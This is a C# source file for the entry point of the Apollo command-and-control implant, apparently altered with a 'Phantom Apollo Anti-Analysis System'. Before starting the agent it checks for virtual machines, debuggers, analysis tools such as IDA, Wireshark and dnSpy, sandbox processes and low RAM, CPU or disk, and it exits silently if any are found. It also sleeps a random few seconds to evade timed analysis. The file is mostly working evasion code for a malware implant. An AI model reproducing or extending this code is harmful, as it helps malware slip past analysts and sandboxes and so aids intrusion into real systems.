using System;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using System.Linq;
using System.Collections.Concurrent;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using System.Runtime.InteropServices;
using System.Management;
using System.Diagnostics;
using Microsoft.Win32;

namespace Apollo
{
    class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static AutoResetEvent _connected = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static Action<object> _sendAction;
        private static CancellationTokenSource _cancellationToken = new CancellationTokenSource();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _complete  = new AutoResetEvent(false);
        private static bool _completed;
        private static Action<object> _flushMessages;
        public static void Main(string[] args)
        {
            // Phantom Apollo Anti-Analysis System
            if (IsVirtualMachine() || IsDebuggerPresent() || IsSandboxEnvironment())
            {
                Environment.Exit(0);
                return;
            }

            // Random delay to evade time-based analysis
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(3000, 8000));

            // Hardware profiling check
            if (!ValidateHardwareProfile())
            {
                Environment.Exit(0);
                return;
            }

            // This is main execution.
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }

        private static bool IsVirtualMachine()
        {
            try
            {
                // Check for VMware
                string[] vmwareFiles = {
                    @"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
                    @"C:\Windows\System32\drivers\vmhgfs.sys",
                    @"C:\Windows\System32\drivers\vmmouse.sys"
                };
                
                foreach (string file in vmwareFiles)
                {
                    if (System.IO.File.Exists(file)) return true;
                }

                // Check registry for VM indicators
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Disk\Enum"))
                    {
                        if (key != null)
                        {
                            string diskInfo = key.GetValue("0")?.ToString() ?? "";
                            if (diskInfo.Contains("VBOX") || diskInfo.Contains("VMWARE") || diskInfo.Contains("QEMU"))
                                return true;
                        }
                    }
                }
                catch { }

                // Check for VirtualBox
                if (System.IO.Directory.Exists(@"C:\Program Files\Oracle\VirtualBox Guest Additions"))
                    return true;

                // WMI checks
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString() ?? "";
                        string model = obj["Model"]?.ToString() ?? "";
                        
                        if (manufacturer.Contains("VMware") || manufacturer.Contains("VirtualBox") ||
                            model.Contains("Virtual") || model.Contains("VMware"))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        private static bool IsDebuggerPresent()
        {
            try
            {
                // Check multiple debugger detection methods
                if (Debugger.IsAttached) return true;

                bool remoteDebugger = false;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remoteDebugger);
                if (remoteDebugger) return true;

                // Check for common debugging processes
                string[] debuggerProcesses = {
                    "ollydbg", "x64dbg", "x32dbg", "ida", "wireshark", "fiddler",
                    "windbg", "immunity", "cheatengine", "dnspy", "ilspy"
                };

                foreach (Process proc in Process.GetProcesses())
                {
                    foreach (string debugger in debuggerProcesses)
                    {
                        if (proc.ProcessName.ToLower().Contains(debugger))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool IsSandboxEnvironment()
        {
            try
            {
                // Check for sandbox indicators
                string[] sandboxProcesses = {
                    "vmsrvc", "vboxtray", "sandboxiedcomlaunch", "sandboxierpcss",
                    "procmon", "regmon", "filemon", "wireshark", "fiddler",
                    "vmwareuser", "vmwaretray", "autorunsc", "autoruns"
                };

                foreach (Process proc in Process.GetProcesses())
                {
                    foreach (string sandbox in sandboxProcesses)
                    {
                        if (proc.ProcessName.ToLower().Contains(sandbox))
                            return true;
                    }
                }

                // Check for limited user interaction (sandbox indicator)
                try
                {
                    // Simple timing check instead of cursor position
                    DateTime startTime = DateTime.Now;
                    Thread.Sleep(50);
                    TimeSpan elapsed = DateTime.Now - startTime;
                    if (elapsed.TotalMilliseconds < 40) // Too fast execution
                        return true;
                }
                catch { }

            }
            catch { }
            return false;
        }

        private static bool ValidateHardwareProfile()
        {
            try
            {
                // Check RAM (less than 2GB indicates VM)
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        ulong totalRAM = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                        if (totalRAM < 2000000000) // Less than 2GB
                            return false;
                    }
                }

                // Check CPU cores
                int coreCount = Environment.ProcessorCount;
                if (coreCount < 2)
                    return false;

                // Check disk size
                foreach (System.IO.DriveInfo drive in System.IO.DriveInfo.GetDrives())
                {
                    if (drive.IsReady && drive.DriveType == System.IO.DriveType.Fixed)
                    {
                        if (drive.TotalSize < 50000000000) // Less than 50GB
                            return false;
                    }
                }
            }
            catch { }
            return true;
        }

        private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _complete.Set();
        }

        private static void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] bdata))
                {
                    pipe.BeginWrite(bdata, 0, bdata.Length, OnAsyncMessageSent, pipe);
                }
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCData d = args.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            Console.Write(msg);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _receiverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }
    }
}
